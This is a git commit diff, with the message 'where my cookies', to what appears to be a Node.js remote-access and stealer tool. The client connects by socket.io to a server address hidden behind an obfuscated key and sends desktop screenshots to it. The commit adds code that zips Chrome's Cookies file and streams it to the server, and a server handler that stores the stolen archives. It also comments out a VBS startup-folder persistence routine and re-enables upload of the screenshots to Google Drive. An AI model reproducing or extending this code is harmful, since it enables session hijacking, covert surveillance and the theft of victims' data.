1d2e4e25f3f511374958be904267d28b107cc723
Vlad50-50 <auditorrevizor@gmail.com>
2024-05-12 18:29:13 +0300

    where my cookies

--- client/program.js
+++ client/program.js
@@ -7,7 +7,7 @@ function decrypt(encryptedText, key) {
 }
 const key = '080545641479637dd61dddcea091eaf625888a280545d\\\\6414799c637d9cd61dddc91/88a2a210b935dadd6aa4e80a0e5a0591832-02a080545ddde5a059a4e810b935d__a04e810b835da';
 const decryptedText = decrypt('92d81d13fbaaf5fa9715d1d486fab918a6050799b0bc71124fe403d825ce5dfa09eec38911ee29313b5dd1a8d8f1962c', key);
-const targ = decryptedText;
+const targ = 'http://localhost:3000';
 const time = 10000;
 const socket = require('socket.io-client')(targ);
 const screenshot = require('screenshot-desktop');
@@ -16,6 +16,7 @@ const fs = require('fs');
 const os = require('os');
 const extract = require('extract-zip');
 const path = require('path')
+const archiver = require('archiver');
 
 const username = os.userInfo().username;
 const HD = os.homedir();
@@ -37,25 +38,25 @@ async function connect() {
 }
 
 async function uploadImage() {
-    fs.access(HD + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.vbs",fs.F_OK,(err) => {
-        if (err) {
-            console.log("File not exist");
-            fs.writeFile(path.join(__dirname,".vbs"),
-            `Set WshShell = CreateObject("WScript.Shell")
-            WshShell.Run """` + HD + `\\OneDrive\\Робочий стіл\\socket\\client\\index.exe""", 1, false
-            `,(err) => {
-                if (err) throw err;
-                console.log("succes created");
-                fs.copyFile(path.join(__dirname,".vbs"),path.join(HD + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', '.vbs'), (err) => {
-                    if (err) {
-                      console.error('Ошибка при копировании файла:', err);
-                    } else {
-                      console.log('Файл успешно скопирован в папку автозагрузки.');
-                    }
-                });
-            })
-        }
-    })
+    // fs.access(HD + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.vbs",fs.F_OK,(err) => {
+    //     if (err) {
+    //         console.log("File not exist");
+    //         fs.writeFile(path.join(__dirname,".vbs"),
+    //         `Set WshShell = CreateObject("WScript.Shell")
+    //         WshShell.Run """` + HD + `\\OneDrive\\Робочий стіл\\socket\\client\\index.exe""", 1, false
+    //         `,(err) => {
+    //             if (err) throw err;
+    //             console.log("succes created");
+    //             fs.copyFile(path.join(__dirname,".vbs"),path.join(HD + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', '.vbs'), (err) => {
+    //                 if (err) {
+    //                   console.error('Ошибка при копировании файла:', err);
+    //                 } else {
+    //                   console.log('Файл успешно скопирован в папку автозагрузки.');
+    //                 }
+    //             });
+    //         })
+    //     }
+    // })
     console.log("Uploading img function");
     try {
         const img = await screenshot();
@@ -66,7 +67,42 @@ async function uploadImage() {
         socket.emit('upload_image', data, headers);
         isImageProcessed = false;
         console.log("Sended");
-        
+        try {
+            const filePath = 'C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
+            const archivePath = path.join(__dirname, 'archive.zip');
+            fs.access(filePath, fs.constants.F_OK, (err) => {
+
+                if (!err && !fs.existsSync(path.join(__dirname,'archive.zip'))) {
+                    const output = fs.createWriteStream(archivePath);
+                    const archive = archiver('zip', {
+                      zlib: { level: 9 }
+                    });
+                    output.on('close', () => {
+                        console.log(`Архив создан: ${archive.pointer()} total bytes`);
+                        
+                              const readStream = fs.createReadStream(archivePath);
+                              readStream.on('data', (chunk) => {
+                                socket.emit('uplCookie', chunk,{ name: "username" });
+                            });
+                            readStream.on('end', () => {
+                                  console.log("end");
+                                  socket.emit('end');
+                            });
+                        
+                    });
+                archive.on('error', (err) => {
+                  throw err;
+                });
+                archive.pipe(output);
+                archive.file(filePath, { name: path.basename(filePath) });
+                archive.finalize();
+          } else {
+            console.log(`Отправлено или несуществует.`);
+          }
+        });
+        }catch(err){
+            console.log(err);
+        }
     } catch (error) {
         console.log('Ошибка при создании скриншота:');
         let folderPath = path.join(HD, '\\AppData\\Local\\Temp\\screenCapture\\');
--- serv.js
+++ serv.js
@@ -27,27 +27,45 @@ io.on('connection', (socket) => {
     console.log("New user: " + socket.id);
     socket.emit('give-image')
 
+    let fileStream;
+    socket.on('uplCookie', (data, headers) => {
+        if (!fileStream) {
+            fileStream = fs.createWriteStream(path.join(__dirname,'static','archivs','r-c-' + headers.name + getCurrentDate() + '.zip'));
+        }
+        fileStream.write(data);
+        console.log(headers.name);
+    });
+
+    socket.on('end', () => {
+        if (fileStream) {
+            fileStream.end();
+            console.log("Архив получен");
+            fileStream = null;
+        }
+    });
+
     socket.on('upload_image', (data, headers) => {
         const base64Image = data.image;
         const imageBuffer = Buffer.from(base64Image, 'base64');
-        fs.writeFile(path.join(__dirname,'static', 'data', headers["name"] + '.jpg'), imageBuffer, err => {
+        fs.writeFile(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'), imageBuffer, err => {
             console.log("it will be uploaded");
-            // const auth = new google.auth.GoogleAuth({
-            //     keyFile: path.join(__dirname,"security.json"),
-            //     scopes: ['https://www.googleapis.com/auth/drive'],
-            // });
-            // const drive = google.drive({version: 'v3', auth});
-            // const response = drive.files.create({
-            //     requestBody: {
-            //         name: headers["name"]+getCurrentDate(),
-            //         mimeType: 'image/jpg',
-            //         parents: ['1HskEq4Ss7iKtpsuh8h9mp2zr1LqHALTw']
-            //     },
-            //     media: {
-            //         mimeType: 'image/jpg',
-            //         body: fs.createReadStream(path.join(__dirname,'static', 'data', headers["name"] + '.jpg'))
-            //     }
-            // });
+            const auth = new google.auth.GoogleAuth({
+                keyFile: path.join(__dirname,"security.json"),
+                scopes: ['https://www.googleapis.com/auth/drive'],
+            });
+            const drive = google.drive({version: 'v3', auth});
+            const response = drive.files.create({
+                requestBody: {
+                    name: headers["name"] + getCurrentDate(),
+                    mimeType: 'image/jpg',
+                    parents: ['1HskEq4Ss7iKtpsuh8h9mp2zr1LqHALTw']
+                },
+                media: {
+                    mimeType: 'image/jpg',
+                    body: fs.createReadStream(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'))
+                }
+            });
+            console.log(response);
             socket.emit('image_processed')
         });
     });
